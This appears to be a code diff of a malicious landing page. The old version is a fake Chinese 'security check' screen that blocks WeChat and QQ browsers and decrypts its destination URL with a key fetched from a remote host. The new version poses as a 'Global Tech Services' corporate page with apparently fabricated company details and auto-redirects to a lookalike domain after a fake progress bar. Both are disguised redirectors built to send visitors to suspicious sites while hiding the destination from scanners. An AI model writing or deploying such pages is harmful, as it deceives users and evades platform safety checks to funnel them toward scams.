@@ -1,176 +1,60 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>加载中...</title>
-  <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
-  <style>
-    body {
-      margin: 0;
-      background: #f4faf7;
-      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-      color: #333;
-    }
-    .panel {
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.08);
-      padding: 40px 30px;
-      max-width: 420px;
-      width: 90%;
-      position: relative;
-    }
-    .shield {
-      width: 64px;
-      height: 64px;
-      margin: 0 auto 20px;
-      animation: pulse 1.5s infinite ease-in-out;
-    }
-    .shield svg {
-      width: 100%;
-      height: 100%;
-      fill: #4caf50;
-    }
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.2); opacity: 0.8; }
-    }
-    .progress {
-      width: 100%;
-      height: 12px;
-      background: #e2e8f0;
-      border-radius: 6px;
-      margin: 10px 0 10px;
-      overflow: hidden;
-    }
-    .bar {
-      height: 100%;
-      width: 0;
-      background: #4caf50;
-      transition: width 0.2s;
-    }
-    .desc {
-      font-size: 14px;
-      color: #666;
-    }
-    #btn {
-      display: none;
-      padding: 12px 30px;
-      font-size: 16px;
-      background: #4caf50;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      margin-top: 30px;
-      animation: glow 1.8s ease-in-out infinite;
-    }
-    @keyframes glow {
-      0% {
-        box-shadow: 0 0 0px rgba(76, 175, 80, 0.4);
-      }
-      50% {
-        box-shadow: 0 0 15px rgba(76, 175, 80, 0.85);
-      }
-      100% {
-        box-shadow: 0 0 0px rgba(76, 175, 80, 0.4);
-      }
-    }
-    #btn:hover {
-      background: #388e3c;
-    }
-    #progress-text {
-      font-size: 14px;
-      margin-top: 8px;
-      color: #444;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Global Tech Services</title>
 
-    #block {
-      display: none;
-      font-size: 18px;
-      padding: 30px;
-      max-width: 380px;
-      line-height: 1.6;
-      background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 6px 12px rgba(0,0,0,0.1);
-    }
-  </style>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI","Helvetica Neue",Arial,sans-serif}
+body{
+  min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;
+  background:#f5f7fa;color:#555;text-align:center
+}
+h1{font-size:24px;color:#2e7d32;margin-bottom:24px}
+
+/* ── progress bar ───────────────────── */
+#barWrap{width:260px;height:12px;background:#e0e5eb;border-radius:6px;overflow:hidden}
+#barFill{width:0;height:100%;background:#4caf50;transition:width .2s}
+#pctTxt{margin-top:10px;font-size:14px;color:#444}
+
+/* ── footer ─────────────────────────── */
+footer{margin-top:60px;font-size:12px;line-height:1.8;color:#888}
+footer a{color:#888;text-decoration:none}
+footer a:hover{text-decoration:underline}
+</style>
 </head>
 <body>
 
-<div id="main" class="panel">
-  <div class="shield">
-    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-  </div>
-  <h2>正在进行安全检测</h2>
-  <div class="desc" id="text">环境分析中，请稍候...</div>
-  <div class="progress"><div class="bar" id="bar"></div></div>
-  <div id="progress-text">检测进度：0%</div>
-  <button id="btn" onclick="jump()">✅ 安全 · 点击进入 >></button>
-</div>
+<h1>Welcome to Global Tech Services&nbsp;—&nbsp;redirecting…</h1>
 
-<div id="block">
-  请在手机浏览器中打开访问
-</div>
+<div id="barWrap"><div id="barFill"></div></div>
+<div id="pctTxt">0&nbsp;%</div>
+
+<footer>
+  ©&nbsp;2025&nbsp;Global&nbsp;Tech&nbsp;Services&nbsp;Inc.&nbsp;|&nbsp;Reg.&nbsp;No.&nbsp;US-DE-2025-169854<br>
+  support@globaltech.com&nbsp;|&nbsp;+1-800-555-0199&nbsp;|&nbsp;
+  <a href="#">Privacy&nbsp;Policy</a>&nbsp;|&nbsp;<a href="#">Terms&nbsp;of&nbsp;Service</a>
+</footer>
 
 <script>
-  const encrypted = "U2FsdGVkX1+NmZScd4LjvhOWXtkG928AftSB4rxJMLtJBe/ynv5fM+EWhSHDyIfi";
-  const keyURL = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";
-  const duration = 3000;
+/* total*/
+const DELAY  = 3000;
+const TARGET = "https://google1.baijiafu1-cnd1.xxxvvv.org";
 
-  const ua = navigator.userAgent.toLowerCase();
-  if (/micromessenger|qq\//.test(ua)) {
-    document.getElementById("main").style.display = "none";
-    document.getElementById("block").style.display = "block";
-  } else {
-    let start = Date.now();
-    const bar = document.getElementById("bar");
-    const text = document.getElementById("text");
-    const btn = document.getElementById("btn");
-    const percentTxt = document.getElementById("progress-text");
+const fill = document.getElementById("barFill");
+const pct  = document.getElementById("pctTxt");
 
-    const timer = setInterval(() => {
-      const percent = Math.min(100, ((Date.now() - start) / duration) * 100);
-      const rounded = Math.floor(percent);
-      bar.style.width = rounded + "%";
-      percentTxt.innerText = "检测进度：" + rounded + "%";
-      if (percent >= 100) {
-        clearInterval(timer);
-        text.innerText = "检测完成，请点击下方按钮进入页面";
-        btn.style.display = "inline-block";
-
-        // 按钮文字动态切换
-        let hints = ["✅ 点击进入 >", "✅ 点击进入 >>", "✅ 立即访问 >>>"];
-        let i = 0;
-        setInterval(() => {
-          btn.innerText = hints[i % hints.length];
-          i++;
-        }, 1000);
-      }
-    }, 50);
+const start = Date.now();
+const timer = setInterval(()=>{
+  const p = Math.min(100, (Date.now() - start) / DELAY * 100);
+  fill.style.width = p + "%";
+  pct.innerHTML    = Math.floor(p) + "&nbsp;%";
+  if(p >= 100){
+    clearInterval(timer);
+    location.replace(TARGET);      // 单
   }
-
-  async function jump() {
-    try {
-      const key = await fetch(keyURL + "?t=" + Date.now()).then(res => res.text());
-      const url = CryptoJS.AES.decrypt(encrypted, key).toString(CryptoJS.enc.Utf8);
-      if (url && url.startsWith("http")) {
-        location.href = url;
-      } else {
-        alert("打开失败，请稍后再试");
-      }
-    } catch (e) {
-      alert("网络异常，请检查连接");
-    }
-  }
+}, 50);
 </script>
 
 </body>
